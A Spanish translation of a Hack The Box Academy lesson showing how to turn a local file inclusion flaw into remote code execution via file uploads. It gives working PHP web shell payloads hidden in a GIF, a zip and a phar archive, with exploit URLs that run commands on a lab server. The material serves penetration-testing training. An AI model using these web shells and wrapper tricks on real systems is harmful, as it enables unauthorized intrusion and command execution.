Las funcionalidades de carga de archivos son omnipresentes en la mayoría de las aplicaciones web modernas, ya que los usuarios suelen necesitar configurar su perfil y el uso de la aplicación web subiendo sus datos. Para los atacantes, la capacidad de almacenar archivos en el servidor backend puede ampliar la explotación de muchas vulnerabilidades, como una vulnerabilidad de inclusión de archivos.

El módulo [File Upload Attacks](https://academy.hackthebox.com/module/details/136) cubre diferentes técnicas sobre cómo explotar formularios y funcionalidades de carga de archivos. Sin embargo, para el ataque que vamos a discutir en esta sección, no necesitamos que el formulario de carga de archivos sea vulnerable, sino simplemente que nos permita subir archivos. Si la función vulnerable tiene capacidades de código `Execute`, entonces el código dentro del archivo que subimos se ejecutará si lo incluimos, independientemente de la extensión o tipo de archivo. Por ejemplo, podemos subir un archivo de imagen (por ejemplo, `image.jpg`), y almacenar un código de web shell PHP dentro de él 'en lugar de datos de imagen', y si lo incluimos a través de la vulnerabilidad LFI, el código PHP se ejecutará y tendremos ejecución remota de código.

Como se mencionó en la primera sección, las siguientes son las funciones que permiten ejecutar código con inclusión de archivos, cualquiera de las cuales funcionaría con los ataques de esta sección:

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

## Image upload

La carga de imágenes es muy común en la mayoría de las aplicaciones web modernas, ya que subir imágenes se considera ampliamente seguro si la función de carga está codificada de manera segura. Sin embargo, como se discutió anteriormente, la vulnerabilidad en este caso no está en el formulario de carga de archivos, sino en la funcionalidad de inclusión de archivos.

### Crafting Malicious Image

Nuestro primer paso es crear una imagen maliciosa que contenga un código de web shell PHP y que aún parezca y funcione como una imagen. Así que usaremos una extensión de imagen permitida en nuestro nombre de archivo (por ejemplo, `shell.gif`), y también incluiremos los bytes mágicos de la imagen al comienzo del contenido del archivo (por ejemplo, `GIF8`), en caso de que el formulario de carga verifique tanto la extensión como el tipo de contenido. Podemos hacerlo de la siguiente manera:

```r
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

Este archivo por sí solo es completamente inofensivo y no afectaría a las aplicaciones web normales en lo más mínimo. Sin embargo, si lo combinamos con una vulnerabilidad LFI, entonces podríamos alcanzar la ejecución remota de código.

**Nota:** Estamos usando una imagen `GIF` en este caso ya que sus bytes mágicos son fáciles de escribir, ya que son caracteres ASCII, mientras que otras extensiones tienen bytes mágicos en binario que tendríamos que codificar en URL. Sin embargo, este ataque funcionaría con cualquier tipo de imagen o archivo permitido. El módulo [File Upload Attacks](https://academy.hackthebox.com/module/details/136) profundiza más en los ataques de tipo de archivo, y la misma lógica puede aplicarse aquí.

Ahora, necesitamos subir nuestro archivo de imagen malicioso. Para hacerlo, podemos ir a la página de `Profile Settings` y hacer clic en la imagen del avatar para seleccionar nuestra imagen, y luego hacer clic en cargar y nuestra imagen debería cargarse correctamente:

`http://<SERVER_IP>:<PORT>/settings.php`

![](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)

### Uploaded File Path

Una vez que hemos subido nuestro archivo, todo lo que necesitamos hacer es incluirlo a través de la vulnerabilidad LFI. Para incluir el archivo subido, necesitamos conocer la ruta a nuestro archivo subido. En la mayoría de los casos, especialmente con imágenes, tendríamos acceso a nuestro archivo subido y podemos obtener su ruta desde su URL. En nuestro caso, si inspeccionamos el código fuente después de subir la imagen, podemos obtener su URL:

```r
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**Nota:** Como podemos ver, podemos usar `/profile_images/shell.gif` para la ruta del archivo. Si no sabemos dónde se sube el archivo, entonces podemos fuzzear para encontrar un directorio de cargas, y luego fuzzear para encontrar nuestro archivo subido, aunque esto puede no siempre funcionar ya que algunas aplicaciones web ocultan correctamente los archivos subidos.

Con la ruta del archivo subido en la mano, todo lo que necesitamos hacer es incluir el archivo subido en la función vulnerable LFI, y el código PHP debería ejecutarse, de la siguiente manera:

`http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id`

![](https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg)

Como podemos ver, incluimos nuestro archivo y ejecutamos con éxito el comando `id`.

**Nota:** Para incluir nuestro archivo subido, usamos `./profile_images/` ya que en este caso la vulnerabilidad LFI no prefija ningún directorio antes de nuestra entrada. En caso de que prefijara un directorio antes de nuestra entrada, simplemente necesitamos `../` salir de ese directorio y luego usar nuestra ruta URL, como aprendimos en secciones anteriores.

---

## Zip Upload

Como se mencionó anteriormente, la técnica anterior es muy confiable y debería funcionar en la mayoría de los casos y con la mayoría de los frameworks web, siempre y cuando la función vulnerable permita la ejecución de código. Hay un par de otras técnicas exclusivas de PHP que utilizan wrappers de PHP para lograr el mismo objetivo. Estas técnicas pueden ser útiles en algunos casos específicos donde la técnica anterior no funcione.

Podemos utilizar el wrapper [zip](https://www.php.net/manual/en/wrappers.compression.php) para ejecutar código PHP. Sin embargo, este wrapper no está habilitado por defecto, por lo que este método puede no siempre funcionar. Para hacerlo, podemos comenzar creando un script de web shell PHP y comprimirlo en un archivo zip (llamado `shell.jpg`), de la siguiente manera:

```r
echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**Nota:** Aunque nombramos nuestro archivo zip como (shell.jpg), algunos formularios de carga aún pueden detectar nuestro archivo como un archivo zip a través de pruebas de tipo de contenido y desactivar su carga, por lo que este ataque tiene una mayor probabilidad de funcionar si se permite la carga de archivos zip.

Una vez que subimos el archivo `shell.jpg`, podemos incluirlo con el wrapper `zip` como (`zip://shell.jpg`), y luego referirnos a cualquier archivo dentro de él con `#shell.php` (codificado en URL). Finalmente, podemos ejecutar comandos como siempre con `&cmd=id`, de la siguiente manera:

`http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id`   

![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

Como podemos ver, este método también funciona en la ejecución de comandos a través de scripts PHP comprimidos.

**Nota:** Agregamos el directorio de cargas (`./profile_images/`) antes del nombre del archivo, ya que la página vulnerable (`index.php`) está en el directorio principal.

---

## Phar Upload

Finalmente, podemos usar el wrapper `phar://` para lograr un resultado similar. Para hacerlo, primero escribiremos el siguiente script PHP en un archivo `shell.php`:

```r
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

Este script puede compilarse en un archivo `phar` que, cuando se llame, escribiría un web shell en un subarchivo `shell.txt`, con el que podemos interactuar. Podemos compilarlo en un archivo `phar` y renombrarlo a `shell.jpg` de la siguiente manera:

```r
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

Ahora, deberíamos tener un archivo phar llamado `shell.jpg`. Una vez que lo subimos a la aplicación web, simplemente podemos llamarlo con `phar://` y proporcionar su ruta URL, y luego especificar el subarchivo phar con `/shell.txt` (codificado en URL) para obtener la salida del comando que especificamos con (`&cmd=id`), de la siguiente manera:

`http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id`

![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

Como podemos ver, el comando `id` se ejecutó con éxito. Ambos métodos con wrappers `zip` y `phar` deben considerarse como métodos alternativos en caso de que el primer método no funcione, ya que el primer método que discutimos es el más confiable de los tres.

**Nota:** Hay otro ataque (obsoleto) de LFI/uploads que vale la pena mencionar, que ocurre si la carga de archivos está habilitada en las configuraciones de PHP y la página `phpinfo()` de alguna manera está expuesta a nosotros. Sin embargo, este ataque no es muy común, ya que tiene requisitos muy específicos para que funcione (LFI + cargas habilitadas + PHP antiguo + `phpinfo()` expuesto). Si estás interesado en saber más sobre esto, puedes referirte a [This Link](https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo).